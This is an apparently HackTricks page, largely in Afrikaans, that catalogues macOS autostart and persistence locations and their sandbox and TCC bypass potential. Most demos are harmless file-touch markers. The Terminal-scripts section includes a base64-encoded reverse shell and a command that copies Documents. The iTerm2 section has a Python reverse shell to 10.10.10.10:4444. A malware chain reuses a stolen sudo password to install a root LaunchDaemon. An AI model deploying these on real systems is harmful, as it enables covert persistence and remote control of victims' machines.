# macOS Outomatiese Begin

{{#include ../banners/hacktricks-training.md}}

This section is heavily based on the blog series [**Beyond the good ol' LaunchAgents**](https://theevilbit.github.io/beyond/), the goal is to add **more Autostart Locations** (if possible), indicate **which techniques are still working** nowadays with latest version of macOS (13.4) and to specify the **permissions** needed.

## Sandbox Bypass

> [!TIP]
> Hier kan jy start-ligginge vind wat nuttig is vir **sandbox bypass** wat jou toelaat om eenvoudig iets uit te voer deur dit in 'n lêer te **skryf** en **te wag** vir 'n baie **algemene** **aksie**, 'n bepaalde **tydperk** of 'n **aksie wat jy gewoonlik van binne 'n sandbox kan uitvoer** sonder om root-permissies te benodig.

### Launchd

- Nuttig om sandbox te omseil: [✅](https://emojipedia.org/check-mark-button)
- TCC Bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Locations

- **`/Library/LaunchAgents`**
- **Trigger**: Reboot
- Root vereis
- **`/Library/LaunchDaemons`**
- **Trigger**: Reboot
- Root vereis
- **`/System/Library/LaunchAgents`**
- **Trigger**: Reboot
- Root vereis
- **`/System/Library/LaunchDaemons`**
- **Trigger**: Reboot
- Root vereis
- **`~/Library/LaunchAgents`**
- **Trigger**: Heraanmelding
- **`~/Library/LaunchDemons`**
- **Trigger**: Heraanmelding

> [!TIP]
> As 'n interessante feit het **`launchd`** 'n ingebedde property list in die Mach-o-seksie `__Text.__config` wat ander bekende dienste bevat wat launchd moet begin. Verder kan hierdie dienste die `RequireSuccess`, `RequireRun` en `RebootOnSuccess` bevat, wat beteken dat hulle uitgevoer en suksesvol voltooi moet word.
>
> Natuurlik kan dit nie gewysig word weens code signing nie.

#### Beskrywing & Exploitation

**`launchd`** is die **eerste** **proses** wat deur die OX S kernel by opstart uitgevoer word en die laaste een wat by afsluiting voltooi word. Dit behoort altyd die **PID 1** te hê. Hierdie proses sal die konfigurasies wat in die **ASEP** **plists** aangedui word **lees en uitvoer** in:

- `/Library/LaunchAgents`: Per-gebruiker agents wat deur die admin geïnstalleer is
- `/Library/LaunchDaemons`: Stelselwye daemons wat deur die admin geïnstalleer is
- `/System/Library/LaunchAgents`: Per-gebruiker agents verskaf deur Apple.
- `/System/Library/LaunchDaemons`: Stelselwye daemons verskaf deur Apple.

Wanneer 'n gebruiker aanmeld, word die plists geleë in `/Users/$USER/Library/LaunchAgents` en `/Users/$USER/Library/LaunchDemons` begin met die **toestemmings van die aangetekende gebruiker**.

Die **hoofverskil** tussen agents en daemons is dat agents gelaai word wanneer die gebruiker aanmeld en die daemons by stelselopstart gelaai word (aangesien daar dienste soos ssh is wat uitgevoer moet word voordat enige gebruiker toegang tot die stelsel kry). Verder kan agents GUI gebruik, terwyl daemons in die agtergrond moet loop.
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN">
<plist version="1.0">
<dict>
<key>Label</key>
<string>com.apple.someidentifier</string>
<key>ProgramArguments</key>
<array>
<string>bash -c 'touch /tmp/launched'</string> <!--Prog to execute-->
</array>
<key>RunAtLoad</key><true/> <!--Execute at system startup-->
<key>StartInterval</key>
<integer>800</integer> <!--Execute each 800s-->
<key>KeepAlive</key>
<dict>
<key>SuccessfulExit</key></false> <!--Re-execute if exit unsuccessful-->
<!--If previous is true, then re-execute in successful exit-->
</dict>
</dict>
</plist>
```
Daar is gevalle waar 'n **agent uitgevoer moet word voordat die gebruiker aanmeld**, hierdie word **PreLoginAgents** genoem. Byvoorbeeld, dit is nuttig om assistiewe tegnologie tydens aanmelding te voorsien. Hulle kan ook in `/Library/LaunchAgents` gevind word (sien [**here**](https://github.com/HelmutJ/CocoaSampleCode/tree/master/PreLoginAgents) vir 'n voorbeeld).

> [!TIP]
> New Daemons or Agents config files will be **gelaai na die volgende herbegin of deur gebruik te maak van** `launchctl load <target.plist>` Dit is **ook moontlik om .plist files without that extension** met `launchctl -F <file>` (egter daardie plist files sal nie outomaties na herbegin gelaai word nie).\
> Dit is ook moontlik om te **unload** met `launchctl unload <target.plist>` (die proses waarna dit verwys sal beëindig word),
>
> Om **verseker** dat daar nie **iets** (soos 'n override) is wat **voorkom** dat 'n **Agent** of **Daemon** **van** **hardloop** nie, voer uit: `sudo launchctl load -w /System/Library/LaunchDaemos/com.apple.smdb.plist`

Lys al die agents and daemons gelaai deur die huidige gebruiker:
```bash
launchctl list
```
#### Voorbeeld kwaadwillige LaunchDaemon-ketting (hergebruik van wagwoord)

Onlangs het 'n macOS infostealer 'n **opgetekende sudo-wagwoord** hergebruik om 'n user agent en 'n root LaunchDaemon neer te sit:

- Skryf die agent-lus na `~/.agent` en maak dit uitvoerbaar.
- Genereer 'n plist in `/tmp/starter` wat na daardie agent wys.
- Hergebruik die opgetekende wagwoord met `sudo -S` om dit na `/Library/LaunchDaemons/com.finder.helper.plist` te kopieer, `root:wheel` te stel, en dit te laai met `launchctl load`.
- Begin die agent stilweg via `nohup ~/.agent >/dev/null 2>&1 &` om die uitvoer te loskoppel.
```bash
printf '%s\n' "$pw" | sudo -S cp /tmp/starter /Library/LaunchDaemons/com.finder.helper.plist
printf '%s\n' "$pw" | sudo -S chown root:wheel /Library/LaunchDaemons/com.finder.helper.plist
printf '%s\n' "$pw" | sudo -S launchctl load /Library/LaunchDaemons/com.finder.helper.plist
nohup "$HOME/.agent" >/dev/null 2>&1 &
```
> [!WARNING]
> As 'n plist deur 'n user besit word, selfs al is dit in stelselwye daemon-lêergidse, sal die **taak as die user uitgevoer word** en nie as root nie. Dit kan sekere privilege escalation-aanvalle voorkom.

#### More info about launchd

**`launchd`** is die **eerste** user-mode proses wat vanaf die **kernel** begin word. Die prosesbegin moet **suksesvol** wees en dit **kan nie afsluit of crash** nie. Dit is selfs **beskerm** teen sekere **doodmaak seine**.

Een van die eerste dinge wat `launchd` sal doen, is om al die **daemons** te **begin**, soos:

- **Timer daemons** gebaseer op tyd om uitgevoer te word:
- atd (`com.apple.atrun.plist`): Het 'n `StartInterval` van 30min
- crond (`com.apple.systemstats.daily.plist`): Het `StartCalendarInterval` om te begin om 00:15
- **Network daemons** soos:
- `org.cups.cups-lpd`: Luister op TCP (`SockType: stream`) met `SockServiceName: printer`
- SockServiceName moet óf 'n poort wees óf 'n diens uit `/etc/services`
- `com.apple.xscertd.plist`: Luister op TCP op poort 1640
- **Path daemons** wat uitgevoer word wanneer 'n gespesifiseerde pad verander:
- `com.apple.postfix.master`: Kontroleer die pad `/etc/postfix/aliases`
- **IOKit notifications daemons**:
- `com.apple.xartstorageremoted`: `"com.apple.iokit.matching" => { "com.apple.device-attach" => { "IOMatchLaunchStream" => 1 ...`
- **Mach port:**
- `com.apple.xscertd-helper.plist`: Dui in die `MachServices` invoer die naam `com.apple.xscertd.helper` aan
- **UserEventAgent:**
- Dit verskil van die vorige een. Dit laat launchd toe om apps te spawn in reaksie op spesifieke gebeurtenisse. In hierdie geval is die hoof-binary betrokke egter nie `launchd` nie maar `/usr/libexec/UserEventAgent`. Dit laai plugins vanaf die SIP-beperkte gids /System/Library/UserEventPlugins/ waar elke plugin sy initialiser aandui in die `XPCEventModuleInitializer` sleutel of, in die geval van ouer plugins, in die `CFPluginFactories` dict onder die sleutel `FB86416D-6164-2070-726F-70735C216EC0` van sy `Info.plist`.

### shell startup files

Writeup: [https://theevilbit.github.io/beyond/beyond_0001/](https://theevilbit.github.io/beyond/beyond_0001/)\
Writeup (xterm): [https://theevilbit.github.io/beyond/beyond_0018/](https://theevilbit.github.io/beyond/beyond_0018/)

- Useful to bypass sandbox: [✅](https://emojipedia.org/check-mark-button)
- TCC Bypass: [✅](https://emojipedia.org/check-mark-button)
- But you need to find an app with a TCC bypass that executes a shell that loads these files

#### Locations

- **`~/.zshrc`, `~/.zlogin`, `~/.zshenv.zwc`**, **`~/.zshenv`, `~/.zprofile`**
- **Aktiveer**: Open 'n terminal met zsh
- **`/etc/zshenv`, `/etc/zprofile`, `/etc/zshrc`, `/etc/zlogin`**
- **Aktiveer**: Open 'n terminal met zsh
- Root vereis
- **`~/.zlogout`**
- **Aktiveer**: Sluit 'n terminal met zsh
- **`/etc/zlogout`**
- **Aktiveer**: Sluit 'n terminal met zsh
- Root vereis
- Potensieel meer in: **`man zsh`**
- **`~/.bashrc`**
- **Aktiveer**: Open 'n terminal met bash
- `/etc/profile` (het nie gewerk nie)
- `~/.profile` (het nie gewerk nie)
- `~/.xinitrc`, `~/.xserverrc`, `/opt/X11/etc/X11/xinit/xinitrc.d/`
- **Aktiveer**: Veronderstel om met xterm te aktiveer, maar dit **is nie geïnstalleer** nie en selfs nadat dit geïnstalleer is word hierdie fout gegee: xterm: `DISPLAY is not set`

#### Description & Exploitation

Wanneer 'n shell-omgewing soos `zsh` of `bash` geïnisieer word, word **sekere startup-lêers uitgevoer**. macOS gebruik tans `/bin/zsh` as die standaard shell. Hierdie shell word outomaties aangeroep wanneer die Terminal-app geopen word of wanneer 'n toestel via SSH bereik word. Terwyl `bash` en `sh` ook in macOS teenwoordig is, moet hulle uitdruklik aangeroep word om gebruik te word.

Die man-bladsy van zsh, wat ons kan lees met **`man zsh`**, het 'n lang beskrywing van die startup-lêers.
```bash
# Example executino via ~/.zshrc
echo "touch /tmp/hacktricks" >> ~/.zshrc
```
### Heropende Toepassings

> [!CAUTION]
> Om die aangeduide uitbuiting te konfigureer en uit te teken en weer aan te meld, of selfs te herbegin, het nie vir my gewerk om die app uit te voer nie. (Die app is nie uitgevoer nie; moontlik moet dit loop wanneer hierdie aksies uitgevoer word)

**Verslag**: [https://theevilbit.github.io/beyond/beyond_0021/](https://theevilbit.github.io/beyond/beyond_0021/)

- Nuttig om die sandbox te omseil: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Ligging

- **`~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist`**
- **Trigger**: Herbegin om toepassings te heropen

#### Beskrywing & Uitbuiting

Al die toepassings wat heropen word is binne die plist `~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist`

Maak dus dat die heropen-toepassings jou eie app begin; jy hoef net jou app by die lys te **voeg**.

Die UUID kan gevind word deur daardie gids te lys of met `ioreg -rd1 -c IOPlatformExpertDevice | awk -F'"' '/IOPlatformUUID/{print $4}'`

Om die toepassings wat heropen sal word te kontroleer, kan jy doen:
```bash
defaults -currentHost read com.apple.loginwindow TALAppsToRelaunchAtLogin
#or
plutil -p ~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist
```
Om **'n toepassing by hierdie lys te voeg** kan jy gebruik:
```bash
# Adding iTerm2
/usr/libexec/PlistBuddy -c "Add :TALAppsToRelaunchAtLogin: dict" \
-c "Set :TALAppsToRelaunchAtLogin:$:BackgroundState 2" \
-c "Set :TALAppsToRelaunchAtLogin:$:BundleID com.googlecode.iterm2" \
-c "Set :TALAppsToRelaunchAtLogin:$:Hide 0" \
-c "Set :TALAppsToRelaunchAtLogin:$:Path /Applications/iTerm.app" \
~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist
```
### Terminal Voorkeure

- Nuttig om die sandbox te bypass: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
- Terminal het toegang tot die gebruiker se FDA-permissies wanneer dit gebruik word

#### Ligging

- **`~/Library/Preferences/com.apple.Terminal.plist`**
- **Trigger**: Maak Terminal oop

#### Beskrywing & Uitbuiting

In **`~/Library/Preferences`** word die voorkeurinstellings van die gebruiker vir toepassings gestoor. Sommige van hierdie voorkeure kan 'n konfigurasie bevat om ander toepassings/skripte uit te voer.

Byvoorbeeld, die Terminal kan 'n opdrag by opstart uitvoer:

<figure><img src="../images/image (1148).png" alt="" width="495"><figcaption></figcaption></figure>

Hierdie konfigurasie word weerspieël in die lêer **`~/Library/Preferences/com.apple.Terminal.plist`** soos volg:
```bash
[...]
"Window Settings" => {
"Basic" => {
"CommandString" => "touch /tmp/terminal_pwn"
"Font" => {length = 267, bytes = 0x62706c69 73743030 d4010203 04050607 ... 00000000 000000cf }
"FontAntialias" => 1
"FontWidthSpacing" => 1.004032258064516
"name" => "Basic"
"ProfileCurrentVersion" => 2.07
"RunCommandAsShell" => 0
"type" => "Window Settings"
}
[...]
```
Dus, as die plist van die voorkeure van die terminal in die stelsel oorgeskryf kan word, kan die **`open`** funksionaliteit gebruik word om **die terminal oop te maak en daardie opdrag sal uitgevoer word**.

Jy kan dit vanaf die cli byvoeg met:
```bash
# Add
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"CommandString\" 'touch /tmp/terminal-start-command'" $HOME/Library/Preferences/com.apple.Terminal.plist
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"RunCommandAsShell\" 0" $HOME/Library/Preferences/com.apple.Terminal.plist

# Remove
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"CommandString\" ''" $HOME/Library/Preferences/com.apple.Terminal.plist
```
### Terminal-skripte / Ander lêeruitbreidings

- Nuttig om sandbox te bypass: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
- Terminal kan gebruik word om die FDA-permissies van die gebruiker te benut wanneer die gebruiker dit gebruik

#### Ligging

- **Enige plek**
- **Trigger**: Open Terminal

#### Beskrywing & Uitbuiting

As jy 'n [**`.terminal`** script](https://stackoverflow.com/questions/32086004/how-to-use-the-default-terminal-settings-when-opening-a-terminal-file-osx) skep en dit oopmaak, sal die **Terminal-toepassing** outomaties aangeroep word om die daarin aangeduide opdragte uit te voer. As die Terminal-app sekere spesiale voorregte het (soos TCC), sal jou opdrag met daardie spesiale voorregte uitgevoer word.

Probeer dit met:
```bash
# Prepare the payload
cat > /tmp/test.terminal << EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CommandString</key>
<string>mkdir /tmp/Documents; cp -r ~/Documents /tmp/Documents;</string>
<key>ProfileCurrentVersion</key>
<real>2.0600000000000001</real>
<key>RunCommandAsShell</key>
<false/>
<key>name</key>
<string>exploit</string>
<key>type</key>
<string>Window Settings</string>
</dict>
</plist>
EOF

# Trigger it
open /tmp/test.terminal

# Use something like the following for a reverse shell:
<string>echo -n "YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvNDQ0NCAwPiYxOw==" | base64 -d | bash;</string>
```
You could also use the extensions **`.command`**, **`.tool`**, with regular shell scripts content and they will be also opened by Terminal.

> [!CAUTION]
> If Terminal has **Full Disk Access** it will be able to complete that action (note that the command executed will be visible in a Terminal window).

### Audio Plugins

Writeup: [https://theevilbit.github.io/beyond/beyond_0013/](https://theevilbit.github.io/beyond/beyond_0013/)\
Writeup: [https://posts.specterops.io/audio-unit-plug-ins-896d3434a882](https://posts.specterops.io/audio-unit-plug-ins-896d3434a882)

- Nuttig om sandbox te omseil: [✅](https://emojipedia.org/check-mark-button)
- TCC-bypass: [🟠](https://emojipedia.org/large-orange-circle)
- Jy kan dalk ekstra TCC-toegang kry

#### Location

- **`/Library/Audio/Plug-Ins/HAL`**
- Root benodig
- **Trigger**: Herbegin coreaudiod of die rekenaar
- **`/Library/Audio/Plug-ins/Components`**
- Root benodig
- **Trigger**: Herbegin coreaudiod of die rekenaar
- **`~/Library/Audio/Plug-ins/Components`**
- **Trigger**: Herbegin coreaudiod of die rekenaar
- **`/System/Library/Components`**
- Root benodig
- **Trigger**: Herbegin coreaudiod of die rekenaar

#### Description

Volgens die vorige writeups is dit moontlik om sekere audio plugins te compile en hulle gelaai te kry.

### QuickLook Plugins

Writeup: [https://theevilbit.github.io/beyond/beyond_0028/](https://theevilbit.github.io/beyond/beyond_0028/)

- Nuttig om sandbox te omseil: [✅](https://emojipedia.org/check-mark-button)
- TCC-bypass: [🟠](https://emojipedia.org/large-orange-circle)
- Jy kan dalk ekstra TCC-toegang kry

#### Location

- `/System/Library/QuickLook`
- `/Library/QuickLook`
- `~/Library/QuickLook`
- `/Applications/AppNameHere/Contents/Library/QuickLook/`
- `~/Applications/AppNameHere/Contents/Library/QuickLook/`

#### Description & Exploitation

QuickLook plugins kan uitgevoer word wanneer jy die **voorskou van 'n lêer aktiveer** (druk spasiebalk met die lêer in Finder geselekteer) en 'n **plugin wat daardie lêertipe ondersteun** geïnstalleer is.

Dit is moontlik om jou eie QuickLook-plugin te compile, dit in een van die vorige liggings te plaas sodat dit gelaai word, en dan na 'n ondersteunende lêer te gaan en spasie te druk om dit te aktiveer.

### ~~Login/Logout Hooks~~

> [!CAUTION]
> This didn't work for me, neither with the user LoginHook nor with the root LogoutHook

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0022/](https://theevilbit.github.io/beyond/beyond_0022/)

- Nuttig om sandbox te omseil: [✅](https://emojipedia.org/check-mark-button)
- TCC-bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Location

- You need to be able to execute something like `defaults write com.apple.loginwindow LoginHook /Users/$USER/hook.sh`
- `Lo`cated in `~/Library/Preferences/com.apple.loginwindow.plist`

Hulle is verouderd maar kan gebruik word om commands uit te voer wanneer 'n gebruiker aanmeld.
```bash
cat > $HOME/hook.sh << EOF
#!/bin/bash
echo 'My is: \`id\`' > /tmp/login_id.txt
EOF
chmod +x $HOME/hook.sh
defaults write com.apple.loginwindow LoginHook /Users/$USER/hook.sh
defaults write com.apple.loginwindow LogoutHook /Users/$USER/hook.sh
```
Hierdie instelling word gestoor in `/Users/$USER/Library/Preferences/com.apple.loginwindow.plist`
```bash
defaults read /Users/$USER/Library/Preferences/com.apple.loginwindow.plist
{
LoginHook = "/Users/username/hook.sh";
LogoutHook = "/Users/username/hook.sh";
MiniBuddyLaunch = 0;
TALLogoutReason = "Shut Down";
TALLogoutSavesState = 0;
oneTimeSSMigrationComplete = 1;
}
```
Om dit te verwyder:
```bash
defaults delete com.apple.loginwindow LoginHook
defaults delete com.apple.loginwindow LogoutHook
```
Die root user een word gestoor in **`/private/var/root/Library/Preferences/com.apple.loginwindow.plist`**

## Conditional Sandbox Bypass

> [!TIP]
> Hier kan jy beginlokasies vind wat nuttig is vir **sandbox bypass** wat jou toelaat om eenvoudig iets uit te voer deur dit in 'n lêer te skryf en te reken op nie besonders algemene toestande nie, soos spesifieke **programs installed**, "ongewoon" gebruiker-aksies of omgewings.

### Cron

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0004/](https://theevilbit.github.io/beyond/beyond_0004/)

- Nuttig vir sandbox bypass: [✅](https://emojipedia.org/check-mark-button)
- Jy moet egter in staat wees om die `crontab` binary uit te voer
- Of wees root
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Location

- **`/usr/lib/cron/tabs/`, `/private/var/at/tabs`, `/private/var/at/jobs`, `/etc/periodic/`**
- Root benodig vir direkte skryftoegang. Geen root benodig as jy `crontab <file>` kan uitvoer
- **Trigger**: Hang af van die cron job

#### Description & Exploitation

Lys die cron jobs van die **huidige gebruiker** met:
```bash
crontab -l
```
Jy kan ook al die cron jobs van gebruikers sien in **`/usr/lib/cron/tabs/`** en **`/var/at/tabs/`** (vereis root-toegang).

In MacOS kan verskeie vouers wat skripte met **'n bepaalde frekwensie** uitvoer gevind word in:
```bash
# The one with the cron jobs is /usr/lib/cron/tabs/
ls -lR /usr/lib/cron/tabs/ /private/var/at/jobs /etc/periodic/
```
Daar kan jy die gewone **cron** **jobs**, die **at** **jobs** (nie baie gebruik nie) en die **periodic** **jobs** (hoofsaaklik gebruik vir die skoonmaak van tydelike lêers) vind. Die daaglikse periodic jobs kan byvoorbeeld uitgevoer word met: `periodic daily`.

Om 'n **user cronjob programatically** by te voeg, kan jy die volgende gebruik:
```bash
echo '* * * * * /bin/bash -c "touch /tmp/cron3"' > /tmp/cron
crontab /tmp/cron
```
### iTerm2

Verslag: [https://theevilbit.github.io/beyond/beyond_0002/](https://theevilbit.github.io/beyond/beyond_0002/)

- Nuttig om sandbox te omseil: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
- iTerm2 het voorheen TCC permissions gehad

#### Ligginge

- **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch`**
- **Trigger**: Maak iTerm oop
- **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch.scpt`**
- **Trigger**: Maak iTerm oop
- **`~/Library/Preferences/com.googlecode.iterm2.plist`**
- **Trigger**: Maak iTerm oop

#### Beskrywing & Uitbuiting

Skripte wat in **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch`** gestoor is, sal uitgevoer word. Byvoorbeeld:
```bash
cat > "$HOME/Library/Application Support/iTerm2/Scripts/AutoLaunch/a.sh" << EOF
#!/bin/bash
touch /tmp/iterm2-autolaunch
EOF

chmod +x "$HOME/Library/Application Support/iTerm2/Scripts/AutoLaunch/a.sh"
```
of:
```bash
cat > "$HOME/Library/Application Support/iTerm2/Scripts/AutoLaunch/a.py" << EOF
#!/usr/bin/env python3
import iterm2,socket,subprocess,os

async def main(connection):
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('10.10.10.10',4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(['zsh','-i']);
async with iterm2.CustomControlSequenceMonitor(
connection, "shared-secret", r'^create-window$') as mon:
while True:
match = await mon.async_get()
await iterm2.Window.async_create(connection)

iterm2.run_forever(main)
EOF
```
Die skrip **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch.scpt`** sal ook uitgevoer word:
```bash
do shell script "touch /tmp/iterm2-autolaunchscpt"
```
Die iTerm2-voorkeure geleë in **`~/Library/Preferences/com.googlecode.iterm2.plist`** kan 'n command aandui om uit te voer wanneer die iTerm2-terminal geopen word.

Hierdie instelling kan in die iTerm2-instellings gekonfigureer word:

<figure><img src="../images/image (37).png" alt="" width="563"><figcaption></figcaption></figure>

En die command word in die voorkeure weerspieël:
```bash
plutil -p com.googlecode.iterm2.plist
{
[...]
"New Bookmarks" => [
0 => {
[...]
"Initial Text" => "touch /tmp/iterm-start-command"
```
Jy kan die opdrag om uit te voer instel met:
```bash
# Add
/usr/libexec/PlistBuddy -c "Set :\"New Bookmarks\":0:\"Initial Text\" 'touch /tmp/iterm-start-command'" $HOME/Library/Preferences/com.googlecode.iterm2.plist

# Call iTerm
open /Applications/iTerm.app/Contents/MacOS/iTerm2

# Remove
/usr/libexec/PlistBuddy -c "Set :\"New Bookmarks\":0:\"Initial Text\" ''" $HOME/Library/Preferences/com.googlecode.iterm2.plist
```
> [!WARNING]
> Hoog waarskynlik bestaan daar **ander maniere om die iTerm2-voorkeure te misbruik** om ewekansige opdragte uit te voer.

### xbar

Skrywing: [https://theevilbit.github.io/beyond/beyond_0007/](https://theevilbit.github.io/beyond/beyond_0007/)

- Nuttig om te bypass sandbox: [✅](https://emojipedia.org/check-mark-button)
- Maar xbar moet geïnstalleer wees
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
- Dit versoek Accessibility permissions

#### Location

- **`~/Library/Application\ Support/xbar/plugins/`**
- **Trigger**: Once xbar is executed

#### Description

If the popular program [**xbar**](https://github.com/matryer/xbar) is installed, it's possible to write a shell script in **`~/Library/Application\ Support/xbar/plugins/`** which will be executed when xbar is started:
```bash
cat > "$HOME/Library/Application Support/xbar/plugins/a.sh" << EOF
#!/bin/bash
touch /tmp/xbar
EOF
chmod +x "$HOME/Library/Application Support/xbar/plugins/a.sh"
```
### Hammerspoon

**Skryfbeskrywing**: [https://theevilbit.github.io/beyond/beyond_0008/](https://theevilbit.github.io/beyond/beyond_0008/)

- Nuttig om bypass sandbox: [✅](https://emojipedia.org/check-mark-button)
- Maar Hammerspoon moet geïnstalleer wees
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
- Dit versoek Accessibility-toestemmings

#### Ligging

- **`~/.hammerspoon/init.lua`**
- **Trigger**: Sodra hammerspoon uitgevoer word

#### Beskrywing

[**Hammerspoon**](https://github.com/Hammerspoon/hammerspoon) dien as 'n automatiseringsplatform vir **macOS**, en benut die **LUA scripting language** vir sy werkinge. Dit ondersteun byvoorbeeld die integrasie van volledige AppleScript-kode en die uitvoering van shell scripts, wat sy skripvermoëns aansienlik verbeter.

Die app soek na 'n enkele lêer, `~/.hammerspoon/init.lua`, en wanneer dit begin word sal die skrip uitgevoer word.
```bash
mkdir -p "$HOME/.hammerspoon"
cat > "$HOME/.hammerspoon/init.lua" << EOF
hs.execute("/Applications/iTerm.app/Contents/MacOS/iTerm2")
EOF
```
### BetterTouchTool

- Nuttig om sandbox te omseil: [✅](https://emojipedia.org/check-mark-button)
- Maar BetterTouchTool moet geïnstalleer wees
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
- Dit vra Automation-Shortcuts en Accessibility toestemmings

#### Location

- `~/Library/Application Support/BetterTouchTool/*`

Hierdie tool maak dit moontlik om toepassings of scripts aan te dui wat uitgevoer word wanneer sekere shortcuts gedruk word. 'n Aanvaller kan moontlik sy eie **shortcut and action to execute in the database** konfigureer om dit arbitrary code uit te voer (’n shortcut kan bloot wees om ’n sleutel te druk).

### Alfred

- Nuttig om sandbox te omseil: [✅](https://emojipedia.org/check-mark-button)
- Maar Alfred moet geïnstalleer wees
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
- Dit vra Automation, Accessibility en selfs Full-Disk Access toestemmings

#### Location

- `???`

Dit laat toe om workflows te skep wat code kan uitvoer wanneer sekere voorwaardes voldaan is. Potensieel kan 'n aanvaller 'n workflow-lêer skep en Alfred daartoe bring om dit te laai (dit vereis die premium-weergawe om workflows te gebruik).

### SSHRC

Writeup: [https://theevilbit.github.io/beyond/beyond_0006/](https://theevilbit.github.io/beyond/beyond_0006/)

- Nuttig om sandbox te omseil: [✅](https://emojipedia.org/check-mark-button)
- Maar ssh moet geaktiveer en gebruik word
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
- SSH het voorheen FDA access gehad

#### Location

- **`~/.ssh/rc`**
- **Trigger**: Aanmelding via ssh
- **`/etc/ssh/sshrc`**
- Root vereis
- **Trigger**: Aanmelding via ssh

> [!CAUTION]
> To turn ssh on requres Full Disk Access:
>
> ```bash
> sudo systemsetup -setremotelogin on
> ```

#### Description & Exploitation

Standaard, tensy `PermitUserRC no` in `/etc/ssh/sshd_config`, wanneer 'n gebruiker **aanmeld via SSH** sal die skripte **`/etc/ssh/sshrc`** en **`~/.ssh/rc`** uitgevoer word.

### **Login Items**

Writeup: [https://theevilbit.github.io/beyond/beyond_0003/](https://theevilbit.github.io/beyond/beyond_0003/)

- Nuttig om sandbox te omseil: [✅](https://emojipedia.org/check-mark-button)
- Maar jy moet `osascript` met args uitvoer
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Locations

- **`~/Library/Application Support/com.apple.backgroundtaskmanagementagent`**
- **Trigger:** Aanmelding
- Exploit payload gestoor deur **`osascript`** aan te roep
- **`/var/db/com.apple.xpc.launchd/loginitems.501.plist`**
- **Trigger:** Aanmelding
- Root vereis

#### Description

In System Preferences -> Users & Groups -> **Login Items** kan jy **items vind wat uitgevoer word wanneer die gebruiker aanmeld**.\
Dit is moontlik om hulle te lys, by te voeg en te verwyder vanaf die command line:
```bash
#List all items:
osascript -e 'tell application "System Events" to get the name of every login item'

#Add an item:
osascript -e 'tell application "System Events" to make login item at end with properties {path:"/path/to/itemname", hidden:false}'

#Remove an item:
osascript -e 'tell application "System Events" to delete login item "itemname"'
```
Hierdie items word gestoor in die lêer **`~/Library/Application Support/com.apple.backgroundtaskmanagementagent`**

**Login items** kan **ook** aangedui word met die API [SMLoginItemSetEnabled](https://developer.apple.com/documentation/servicemanagement/1501557-smloginitemsetenabled?language=objc) wat die konfigurasie in **`/var/db/com.apple.xpc.launchd/loginitems.501.plist`** sal stoor

### ZIP as Login Item

(Check previous section about Login Items, this is an extension)

As jy 'n **ZIP** lêer as 'n **Login Item** stoor, sal die **`Archive Utility`** dit oopmaak en as die zip byvoorbeeld in **`~/Library`** gestoor is en die gids **`LaunchAgents/file.plist`** met 'n backdoor bevat, sal daardie gids geskep word (dit word nie standaard geskep nie) en die plist sal bygevoeg word sodat die volgende keer wanneer die gebruiker weer aanmeld, die **backdoor indicated in the plist will be executed**.

Nog 'n opsie sou wees om die lêers **`.bash_profile`** en **`.zshenv`** binne die gebruikers HOME te skep, sodat as die gids LaunchAgents reeds bestaan hierdie tegniek steeds sou werk.

### At

Writeup: [https://theevilbit.github.io/beyond/beyond_0014/](https://theevilbit.github.io/beyond/beyond_0014/)

- Nuttig om sandbox te omseil: [✅](https://emojipedia.org/check-mark-button)
- Maar jy moet **`at`** uitvoer en dit moet **aangeskakel** wees
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Ligging

- Jy moet **`at`** uitvoer en dit moet **aangeskakel** wees

#### **Beskrywing**

`at`-take is ontwerp om **eenmalige take te skeduleer** wat op sekere tye uitgevoer word. In teenstelling met cron jobs, word `at`-take outomaties verwyder na uitvoering. Dit is belangrik om op te let dat hierdie take oor stelselherlaaie behoue bly, wat hulle onder sekere omstandighede tot potensiële sekuriteitsrisiko's maak.

Standaard is hulle **uitgeskakel**, maar die **root** gebruiker kan **hulle aktiveer** met:
```bash
sudo launchctl load -F /System/Library/LaunchDaemons/com.apple.atrun.plist
```
Dit sal binne 1 uur 'n lêer skep:
```bash
echo "echo 11 > /tmp/at.txt" | at now+1
```
Kontroleer die taakwaglys met `atq:`
```shell-session
sh-3.2# atq
26	Tue Apr 27 00:46:00 2021
22	Wed Apr 28 00:29:00 2021
```
